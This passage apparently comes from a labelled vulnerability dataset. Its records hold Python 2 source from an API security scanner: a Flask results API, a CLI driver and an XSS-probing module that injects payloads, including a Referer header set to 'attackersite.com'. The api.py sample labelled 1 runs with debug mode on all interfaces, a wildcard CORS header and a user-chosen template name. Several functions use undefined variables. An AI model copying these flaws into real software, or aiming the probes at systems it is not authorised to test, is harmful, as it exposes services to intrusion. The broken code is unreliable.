try:\n                data =  ast.literal_eval(json.dumps(data))\n                if data['scanid']:\n                    if data['scanid'] not in scanids:\n                        scanids.append({\"scanid\" : data['scanid'], \"name\" : data['name'], \"url\" : data['url']}) \n            except:\n                pass\n\n        return jsonify(scanids)\n############################# Alerts API ##########################################\n\n# Returns vulnerbilities identified by tool \ndef fetch_records(scanid):\n    # Return alerts identified by the tool\n    vul_list = []\n    records = db.vulnerabilities.find({\"scanid\":scanid})\n    print \"Records are \",records\n    if records:\n        for data in records:  \n            print \"Data is\",data\n            if data['req_body'] == None:\n                data['req_body'] = \"NA\" \n\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n            except:\n                print \"Falied to parse\"\n\n            print \"Data\",data\n            try:\n                if data['id'] == \"NA\":\n                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}\n                    vul_list.append(all_data)\n\n                if data['id']:\n                    for vul in alerts:\n                        if data['id'] == vul['id']:\n                            all_data = {\n                                        'url' : data['url'],\n                                        'impact' : data['impact'],\n                                        'name' : data['alert'],\n                                        'req_headers' : data['req_headers'],\n                                        'req_body' : data['req_body'],\n                                        'res_headers' : data['res_headers'],\n                                        'res_body' : data['res_body'],\n                                        'Description' : vul['Description'],\n                                        'remediation' : vul['remediation']\n                                        }\n                            vul_list.append(all_data)\n                            break\n\n            except:\n                pass\n\n        print vul_list\n        return vul_list\n        \n\n@app.route('/alerts/<scanid>', methods=['GET'])\ndef return_alerts(scanid):\n    print \"ScanID is \",scanid\n    result = fetch_records(scanid)\n    resp = jsonify(result)\n    resp.headers[\"Access-Control-Allow-Origin\"] = \"*\"\n    return resp\n\n#############################Dashboard#########################################\n\n@app.route('/', defaults={'page': 'scan.html'})\n@app.route('/<page>')\ndef view_dashboard(page):\n    return render_template('{}'.format(page))\n\napp.run(host='0.0.0.0', port= 8094,debug=True)\n/n/n/nastra.py/n/nimport argparse\nimport base64\nimport json\nimport requests\nimport time\nimport ast\nimport utils.logger as logger\nimport utils.logs as logs\nimport urlparse\n\n\nfrom core.zapscan import *\nfrom core.parsers import *\nfrom utils.logger import *\nfrom core.login import APILogin\nfrom utils.logger import logger\nfrom utils.config import update_value,get_value,get_allvalues\nfrom modules.cors import cors_main\nfrom modules.auth import auth_check\nfrom modules.rate_limit import rate_limit\nfrom modules.csrf import csrf_check\nfrom modules.jwt_attack import jwt_check\nfrom modules.sqli import sqli_check\nfrom modules.xss import xss_check\nfrom core.zap_config import zap_start\nfrom multiprocessing import Process\n\n\ndef parse_collection(collection_name,collection_type):\n    if collection_type == 'Postman':\n        parse_data.postman_parser(collection_name)\n    elif collection_type == 'Swagger':\n        print collection_type\n    else:\n        print \"[-]Failed to Parse collection\"\n        sys.exit(1)\n\ndef add_headers(headers):\n    # This function deals with adding custom header and auth value .\n    get_auth = get_value('config.property','login','auth_type')\n    if get_auth == 'cookie':\n        cookie = get_value('config.property','login','auth')\n        cookie_dict = ast.literal_eval(cookie)\n        cookie_header = {'Cookie': cookie_dict['cookie']}\n        headers.update(cookie_header)\n    try:\n        custom_header = get_value('config.property','login','headers')\n        custom_header = ast.literal_eval(custom_header)\n        headers.update(custom_header)\n    except:\n        pass\n\n    return headers\n\ndef generate_report():\n    # Generating report once the scan is complete.\n    result = api_scan.generate_report()\n    if result is True:\n        print \"%s[+]Report is generated successfully%s\"% (api_logger.G, api_logger.W)\n    else:\n        print \"%s[-]Failed to generate a report%s\"% (api_logger.R, api_logger.W)\n\n\ndef read_scan_policy():\n    try:\n        scan_policy = get_value('scan.property','scan-policy','attack')\n        attack = ast.literal_eval(scan_policy)\n\n    except Exception as e:\n        print e\n        print \"Failed to parse scan property file.\"\n\n    return attack\n\ndef modules_scan(url,method,headers,body,scanid=None):\n    '''Scanning API using different engines '''\n    attack = read_scan_policy()\n    if attack is None:\n        print \"Failed to start scan.\"\n        sys.exit(1)\n\n    if attack['zap'] == \"Y\" or attack['zap'] == \"y\":\n        api_scan = zap_scan()\n        status = zap_start()\n        if status is True:\n            api_scan.start_scan(url,method,headers,body,scanid)\n    \n    # Custom modules scan      \n    if attack['cors'] == 'Y' or attack['cors'] == 'y':\n        cors_main(url,method,headers,body,scanid)\n    if attack['Broken auth'] == 'Y' or attack['Broken auth'] == 'y':\n        auth_check(url,method,headers,body,scanid)\n    if attack['Rate limit'] == 'Y' or attack['Rate limit'] == 'y':\n        rate_limit(url,method,headers,body,scanid)\n    if attack['csrf'] == 'Y' or attack['csrf'] == 'y':\n        csrf_check(url,method,headers,body,scanid)\n    if attack['jwt'] == 'Y' or attack['jwt'] == 'y':\n        jwt_check(url,method,headers,body,scanid)\n    if attack['sqli'] == 'Y' or attack['sqli'] == 'y':\n        sqli_check(url,method,headers,body,scanid)\n    if attack['xss'] == 'Y' or attack['xss'] == 'y':\n        xss_check(url,method,headers,body,scanid)\n\ndef validate_data(url,method):\n    ''' Validate HTTP request data and return boolean value'''\n    validate_url = urlparse.urlparse(url)\n    http_method = ['GET','POST','DEL','OPTIONS','PUT']\n    if method in http_method and bool(validate_url.scheme) is True:\n        validate_result = True\n    else:\n        validate_result = False\n\n    return validate_result\n\ndef scan_single_api(url, method, headers, body, api, scanid=None):\n    ''' This function deals with scanning a single API. '''\n    if headers is None or headers == '':\n            headers = {'Content-Type' : 'application/json'}\n    if type(headers) is not dict:\n        headers = ast.literal_eval(headers)\n    if method == '':\n        method = 'GET'\n\n    result = validate_data(url, method)\n    if result is False:\n        print \"[-]Invalid Arguments\"\n        return False\n\n    p = Process(target=modules_scan,args=(url,method,headers,body,scanid),name='module-scan')\n    p.start()\n    if api == \"Y\":\n        return True\n\n\ndef scan_core(collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata,login_require):\n    ''' Scan API through different engines ''' \n    if collection_type and collection_name is not None:\n        parse_collection(collection_name,collection_type)\n        if login_require is True:\n            api_login.verify_login(parse_data.api_lst)\n        msg = True\n        for data in parse_data.api_lst:\n            try:\n                url = data['url']['raw']\n            except:\n                url = data['url']\n            headers,method,body = data['headers'],data['method'],''\n            if headers:\n                try:\n                    headhers = add_headers(headers)\n                except:\n                    pass\n\n            if data['body'] != '':\n                body = json.loads(base64.b64decode(data['body']))\n\n            \n            modules_scan(url,method,headers,body,attack)        \n\n    else:\n        print \"%s [-]Invalid Collection. Please recheck collection Type/Name %s\" %(api_logger.G, api_logger.W)\n    #generate_report()\n\ndef get_arg(args=None):\n        parser = argparse.ArgumentParser(description='REST API Security testing Framework')\n        parser.add_argument('-c', '--collection_type',\n                            help='Type of API collection',\n                            default='Postman',choices=('Postman', 'Swagger'))\n        parser.add_argument('-n', '--collection_name',\n                            help='Type of API collection')\n        parser.add_argument('-u', '--url',\n                            help='URL of target API')\n        parser.add_argument('-headers', '--headers',\n                            help='Custom headers.Example: {\"token\" : \"123\"}')\n        parser.add_argument('-method', '--method',\n                            help='HTTP request method',\n                            default='GET',choices=('GET', 'POST'))\n        parser.add_argument('-b', '--body',\n                            help='Request body of API')\n        parser.add_argument('-l', '--loginurl',\n                            help='URL of login API')\n        parser.add_argument('-H', '--loginheaders',\n                            help='Headers should be in a dictionary format. Example: {\"accesstoken\" : \"axzvbqdadf\"}')\n        parser.add_argument('-d', '--logindata',\n                            help='login data of API')\n    \n\n        results = parser.parse_args(args)\n        if len(args) == 0:\n            print \"%sAt least one argument is needed to procced.\\nFor further information check help: %spython astra.py --help%s\"% (api_logger.R, api_logger.G, api_logger.W)\n            sys.exit(1)\n\n        return (results.collection_type,\n                results.collection_name,\n                results.url,\n                results.headers,\n                results.method,\n                results.body,\n                results.loginurl,\n                results.loginheaders,\n                results.logindata,\n                )\n\ndef main():\n    collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata = get_arg(sys.argv[1:])\n    if loginheaders is None:\n            loginheaders = {'Content-Type' : 'application/json'}\n    if collection_type and collection_name and loginurl and loginmethod and logindata:\n        # Login data is given as an input. \n        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)\n        login_require = False\n    elif collection_type and collection_name and loginurl:\n        # This will first find the given loginurl from collection and it will fetch auth token. \n        parse_collection(collection_name,collection_type)\n        try:\n            loginurl,lognheaders,loginmethod,logidata = api_login.parse_logindata(loginurl)\n        except:\n           print \"[-]%s Failed to detect login API from collection %s \" %(api_logger.R, api_logger.W)\n           sys.exit(1)\n        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)\n        login_require = False\n    elif loginurl and loginmethod:\n        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)\n        login_require = False\n    elif collection_type and collection_name and headers:\n        #Custom headers\n        update_value('login','header',headers)\n        login_require = False\n    elif url and collection_name and headers:\n        #Custom headers\n        update_value('login','header',headers)\n        login_require = False\n    elif url:\n        if headers is None:\n            headers = {'Content-Type' : 'application/json'}\n        if method is None:\n            method = \"GET\"\n       \n        login_require = False\n    else:\n        login_require = True\n\n    if body:\n        body = ast.literal_eval(body)\n\n    # Configuring ZAP before starting a scan\n    get_auth = get_value('config.property','login','auth_type')\n\n    if collection_type and collection_name is not None:\n        scan_core(collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata,login_require) \n    else:\n        scan_single_api(url, method, headers, body, \"False\")\n\n\nif __name__ == '__main__':\n    \n    api_login = APILogin()\n    parse_data = PostmanParser()\n    api_logger = logger()\n    api_logger.banner()\n    main()\n/n/n/nmodules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post.body)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8", "code": "/API/api.py/n/nimport ast\nimport json\nimport sys\nimport hashlib\nimport time\n\nsys.path.append('../')\n\nfrom flask import Flask,render_template\nfrom flask import Response,make_response\nfrom flask import request\nfrom flask import Flask\nfrom apiscan import scan_single_api\nfrom flask import jsonify\nfrom pymongo import MongoClient\nfrom utils.vulnerabilities import alerts\n \napp = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')\n \n# Mongo DB connection \nclient = MongoClient('localhost',27017)\nglobal db\ndb = client.apiscan\n\n\n############################# Start scan API ######################################\ndef generate_hash():\n    # Return md5 hash value of current timestmap \n    scanid = hashlib.md5(str(time.time())).hexdigest()\n    return scanid\n\n# Start the scan and returns the message\n@app.route('/scan/', methods = ['POST'])\ndef start_scan():\n    scanid = generate_hash()\n    content = request.get_json()\n    try:\n        name = content['appname']\n        url = content['url']\n        headers = content['headers']\n        body = content['body']\n        method = content['method']\n        api = \"Y\"\n        scan_status = scan_single_api(url, method, headers, body, api, scanid)\n        if scan_status is True:\n            # Success\n            msg = {\"status\" : scanid}\n            try:\n                db.scanids.insert({\"scanid\" : scanid, \"name\" : name, \"url\" : url})\n            except:\n                print \"Failed to update DB\"\n        else:\n            msg = {\"status\" : \"Failed\"}\n    \n    except:\n        msg = {\"status\" : \"Failed\"} \n    \n    return jsonify(msg)\n\n\n#############################  Fetch ScanID API #########################################\n@app.route('/scan/scanids/', methods=['GET'])\ndef fetch_scanids():\n    scanids = []\n    records = db.scanids.find({})\n    if records:\n        for data in records:\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n                if data['scanid']:\n                    if data['scanid'] not in scanids:\n                        scanids.append({\"scanid\" : data['scanid'], \"name\" : data['name'], \"url\" : data['url']}) \n            except:\n                pass\n\n        return jsonify(scanids)\n############################# Alerts API ##########################################\n\n# Returns vulnerbilities identified by tool \ndef fetch_records(scanid):\n    # Return alerts identified by the tool\n    vul_list = []\n    records = db.vulnerabilities.find({\"scanid\":scanid})\n    print \"Records are \",records\n    if records:\n        for data in records:  \n            print \"Data is\",data\n            if data['req_body'] == None:\n                data['req_body'] = \"NA\" \n\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n            except:\n                print \"Falied to parse\"\n\n            print \"Data\",data\n            try:\n                if data['id'] == \"NA\":\n                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}\n                    vul_list.append(all_data)\n\n                if data['id']:\n                    for vul in alerts:\n                        if data['id'] == vul['id']:\n                            all_data = {\n                                        'url' : data['url'],\n                                        'impact' : data['impact'],\n                                        'name' : data['alert'],\n                                        'req_headers' : data['req_headers'],\n                                        'req_body' : data['req_body'],\n                                        'res_headers' : data['res_headers'],\n                                        'res_body' : data['res_body'],\n                                        'Description' : vul['Description'],\n                                        'remediation' : vul['remediation']\n                                        }\n                            vul_list.append(all_data)\n                            break\n\n            except:\n                pass\n\n        print vul_list\n        return vul_list\n        \n\n@app.route('/alerts/<scanid>', methods=['GET'])\ndef return_alerts(scanid):\n    print \"ScanID is \",scanid\n    result = fetch_records(scanid)\n    resp = jsonify(result)\n    resp.headers[\"Access-Control-Allow-Origin\"] = \"*\"\n    return resp\n\n#############################Dashboard#########################################\n\n@app.route('/', defaults={'page': 'scan.html'})\n@app.route('/<page>')\ndef view_dashboard(page):\n    return render_template('{}'.format(page))\n\napp.run(host='0.0.0.0', port= 8094,debug=True)\n/n/n/n", "label": 1}, {"id": "27377aa23bcd9153453a2ee04c3dc33120c3b093", "code": "modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "27377aa23bcd9153453a2ee04c3dc33120c3b093", "code": "/modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef 